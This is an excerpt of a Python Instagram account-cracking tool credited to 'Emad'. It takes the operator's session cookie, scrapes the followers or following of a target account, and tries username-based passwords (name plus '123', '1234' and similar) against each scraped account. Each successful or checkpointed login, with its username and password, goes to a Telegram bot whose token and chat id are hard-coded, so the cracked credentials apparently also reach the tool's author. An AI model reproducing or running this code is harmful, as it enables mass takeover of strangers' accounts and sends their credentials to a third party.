...
tokenar="5838319317:AAHhAcLGbwlL7yTrDaiTQAVmh4Uv8KXEg3s"
idar="5170282642"
...
USN = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 Instagram 272.0.0.16.73 Android (29/10; 408dpi; 1080x1798; SHARP/KDDI; SHV41; JWT; qcom; ja_JP; 450448608)"
...
barud4 = random.choice([uazku1, uazku2, uazku3, uazku4, uazku5, uazku6, uazku7])
...
barud3 = random.choice([uaz1, uaz2, uaz3])
...
barud2 = random.choice([uazku1, uazku2, uazku3])
...
barud1 = random.choice([ugent1,ugent2,ugent3])
...
def Banner___Gua__Ngab():
	...
	cetak(panel(f"""[bold white]TELEGRAM  : [bold green]@imad192\n[bold white]TIME CODE : [bold green]1/4/2023\n[bold white]HACKER    : [bold green]INSTAGRAM""",width=30,title=f"[bold white]•[bold red]•[bold green] Emad information [bold red]•[bold white]•",style=f"bold purple"))
	cetak(panel(f"""[bold white]Country  : [bold green]{CN}\n[bold white]City     : [bold green]{TZ}\n[bold white]IP       : [bold green]{IP}""",width=30,title=f"[bold green] User information [bold white]",style=f"bold purple"))

def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{P}[{M}!{P}] login cookie... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		
...
def ggwp17():
        try:
            ...
            Banner___Gua__Ngab()
            prints(Panel(f"login cookie instagram ",width=80,padding=(0,2),style=f"#FFFFFF"))
            coki = input(f"{B}╰─  {P}Enter cookie : {B}")
            loading()
            try:
                ...
                jalan(f'{P}[{H}✓{P}] welcome {H}{useri}{P} ')
                time.sleep(0.05)
                #prints(Panel
                time.sleep(3)
            except (json.decoder.JSONDecodeError, KeyError, AttributeError):
                jalan(f"{P}[{M}X{P}] Cookie Erorr ")
                time.sleep(3)
                RemoveCookie()
                exit()
            except ConnectionAbortedError:
                print(f"{P}[{M}!{P}]  internet Erorr 404")
                time.sleep(3)
                exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
...
class instagram:
	...
	def logo(self):
		for i in external:
			...
			Banner___Gua__Ngab()
			self.mentod()
			komb='[bold white][[bold blue]01[/][bold pink]][/] [bold pink]HACK FOLLOWERS[/]\n[bold pink][[bold blue]02[/][bold pink]][/] [bold pink]HACK FOLLOWING[/]\n[bold pink][[bold green]E[/][bold pink]][/] [bold red] Exit[/] '
		sol().print(nel(komb,style='bold purple',title=f'[bold green]• TOOLS HACK •'))
	...
	def HapusLisen(self):
	    try:
	        xc = input(f"{B}╰─ {P}remove cookie ? : {H}")
	        if xc in ["y","Y"]:
	           os.remove("data/lisensi.txt")
	           jalan(f"{P}[{H}✓{P}] OK EXIT ")
	           exit()
	        elif xc in ["t","T"]:
	            jalan(f"{P}[{B}+{P}] Return to the main menu")
	            time.sleep(2)
	            self.menu()
	        else:
	            self.Exit()
	...
	def Exit(self):
		try:
		    ...
		    xd = input(f'{P}[{B}?{P}] remove y/n ? : {H}')
		    if xd in ["y","Y"]:
		       RemoveCookie()
		       jalan(f"{P}[{H}✓{P}] ok remove cookie")
		       exit()
		    elif xd in ["t","T"]:
		        jalan(f"{P}[{B}+{P}] no remove cookie")
		        time.sleep(2)
		        self.menu()
		    else:
		         self.Exit()
		...
		try:
			for ba in range(100):
				...
				try:
					...
					sys.stdout.write(f"\r{P}[{B}*{P}] TOOTAL ID {wr}{len(internal)} {P}id...")
					sys.stdout.flush()
					time.sleep(0.0002)
				except:
	...
	def idAPI(self,cookie,id):
		if 'sukses' in 'sukses':
			try:
				...
				print(f'{P}[{M}!{P}] Username does not exist')
				exit()
			return idx
		else:lisensi()
					...
					for z in range (9999):
						...
						try:
							for i in x_jason['users']:
								...
								following.append(username)
							wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
							sys.stdout.write(f"\r{P}[{B}🔥{P}] USERNAME {wr}{len(internal)}")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
	...
	def ingfo(self):
		...
		#urut.append
		#self.tol
		prints(Panel(f"{K2}Enjoy the tools of Imad Al-Khashen",width=80,padding=(0,3),style=f"#FFFFFF"))
						...
						if len(w)<3:
							...
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'1234',w+'12345',w+'123456',w+'321',w+'01',w+'02',w+'03']
								else:
									sandi=[w,w+'123',w+'1234',w+'12345',w+'123456',w+'321',w+'01',w+'02',w+'03']
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
	...
	def crackAPI(self,user,pas):
		...
		sys.stdout.write(f'\r{H} Emad {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
		for pw in pas:
				try:
					...
					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
						...
						try:
							...
							requests.post(f"https://api.telegram.org/bot{tokenar}/sendMessage?chat_id={idar}&text="+'\r[✓] OK LOGIN\n𝐍𝐀𝐌𝐄      : {nama}\n𝐔𝐒𝐄𝐑𝐍𝐀𝐌   : {user}\n𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {pw}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐒   : {pengikut}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐆   : {mengikut}\n𝐏𝐎𝐒𝐓      : {postingan}')
							print("\r                                       ")
							adit=f'\r𝐍𝐀𝐌𝐄      : {nama}\n𝐔𝐒𝐄𝐑𝐍𝐀𝐌   : {user}\n𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {pw}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐒   : {pengikut}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐆   : {mengikut}\n𝐏𝐎𝐒𝐓      : {postingan}\nphone number :{nomor}\ndata : {tanggal}'
							pepekXD = nel(adit, style='green')
							print('\n')
							cetak(nel(pepekXD,style='',title='\r[green]KING-EMAD[blue]'))
						...
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						requests.post(f"https://api.telegram.org/bot{tokenar}/sendMessage?chat_id={idar}&text="+'\r[x] NO LOGIN\n𝐍𝐀𝐌𝐄      : {nama}\n𝐔𝐒𝐄𝐑𝐍𝐀𝐌   : {user}\n𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {pw}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐒   : {pengikut}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐆   : {mengikut}\n𝐏𝐎𝐒𝐓      : {postingan}')
						print("\r                                       ")
						adit=f'\r𝐍𝐀𝐌𝐄      : {nama}\n𝐔𝐒𝐄𝐑𝐍𝐀𝐌   : {user}\n𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {pw}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐒   : {pengikut}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐆   : {mengikut}\n𝐏𝐎𝐒𝐓      : {postingan}'
						pepekXD = nel(adit, style='yellow')
						print('\n')
						cetak(nel(pepekXD,style='', title='\r[yellow]KING-EMAD[blue]'))
		...
		try:
			for pw in pas:
				...
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					...
					sys.stdout.write(f'\r{H} Emad {M}spamIP {P}{loop}/{len(internal)}{P} RIZAL-GEGEH-:{H}{len(success)} {N}RIZAL-CEPEH-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
					time.sleep(10)
	...
	def crackAJAX(self,user,pas):
		global loop,success,checkpoint
		ses = requests.Session()
		uas = random.choice([barud1,barud2,barud3,barud4])
		sys.stdout.write(f'\r ╚═➣ Emad 👑 {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)}  {P}');sys.stdout.flush()
		try:
			for pw in pas:
				xxcteam = random.randint(1000000000, 99999999999)
				jam = calendar.timegm(current_GMT)
				...
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					...
					requests.post(f"https://api.telegram.org/bot{tokenar}/sendMessage?chat_id={idar}&text="+f'\r[√] OK LOGIN\n𝐍𝐀𝐌𝐄      : {nama}\n𝐔𝐒𝐄𝐑𝐍𝐀𝐌   : {user}\n𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {pw}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐒   : {pengikut}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐆   : {mengikut}\n𝐏𝐎𝐒𝐓      : {postingan}')
					print("\r                                       ")
					print(f'\r{P}𝐍𝐀𝐌𝐄      : {H}{nama}\n{P}𝐔𝐒𝐄𝐑𝐍𝐀𝐌   : {H}{user}\n{P}𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {H}{pw}\n{P}𝐅𝐎𝐋𝐋𝐎𝐖𝐒   : {H}{pengikut}\n{P}𝐅𝐎𝐋𝐋𝐎𝐖𝐆   : {H}{mengikut}\n{P}𝐏𝐎𝐒𝐓      : {H}{postingan}')
					print('\n')
					cetak(nel(pepekXD,style='',title='\r[green]KING-EMAD[blue]'))
					open(f"IGOK.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'href="https://www.instagram.com/challenge/action/"' in str(xc_team):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					requests.post(f"https://api.telegram.org/bot{tokenar}/sendMessage?chat_id={idar}&text="+f'\r[x] NO LOGIN\n𝐍𝐀𝐌𝐄      : {nama}\n𝐔𝐒𝐄𝐑𝐍𝐀𝐌   : {user}\n𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {pw}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐒   : {pengikut}\n𝐅𝐎𝐋𝐋𝐎𝐖𝐆   : {mengikut}\n𝐏𝐎𝐒𝐓      : {postingan}')
					print("\r                                       ")
					print(f'\r{P}𝐍𝐀𝐌𝐄      : {K}{nama}\n{P}𝐔𝐒𝐄𝐑𝐍𝐀𝐌   : {K}{user}\n{P}𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃  : {K}{pw}\n{P}𝐅𝐎𝐋𝐋𝐎𝐖𝐒   : {K}{pengikut}\n{P}𝐅𝐎𝐋𝐋𝐎𝐖𝐆   : {K}{mengikut}\n{P}𝐏𝐎𝐒𝐓      : {K}{postingan}')
					print('\n')
					cetak(nel(pepekXD,style='', title='\r[yellow]KING-EMAD[blue]'))
					open(f"IGNO.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f'\r{P}[{M}#{P}] Crack {M}SpamIP {P}{loop}/{len(internal)}{P} OK-:{H}{len(success)} {N}CP-:{K}{len(checkpoint)} {P}');sys.stdout.flush()
	...
	def menu(self):
		self.logo()
		c=input(f'{B}╰─  {P}Enter : {B}')
		if c=='':
			self.menu()
		
		elif c in ('66677882','02887788'):
			m=int(f'1')
...
def mengi(self):
			try:
				...
				prints(Panel(f"{P2}Make sure the target is public, not private",width=80,style=f"#FFFFFF"))
				m=int(f'3')
			except:m=1
			for t in range(m):
				t +=1
				nama=input(f'╚═➣ {P}Enter username : {H}')
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=10000',id)
...
def masal(self):
			...
			for t in range(m):
				...
				nama=input(f'╚═➣ {P}Enter username : {H}')
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=10000',id)
			self.passwordAPI(info)

def massal(self):
			menudump.append('pengikut')
			prints(Panel(f"{P2}Make sure the target is public, not private",width=80,style=f"#FFFFFF"))
			m=input(f'{P}[{B}?{P}] Enter username : {H}')
...
def exman():
    ...
    id = 'E'.join(idd)
    os.system('clear')
    if id in requests.get("https://github.com/EmadAlkhashn/key/blob/main/a.txt").text:
        ggwp17()
        pass
    else:
        cetak(panel(f"""[bold red]NO LOGIN....""",width=90,style=f"bold blue"));print(f"╰─ ID YOUR : "+id)
        time.sleep(5)
        sys.exit()
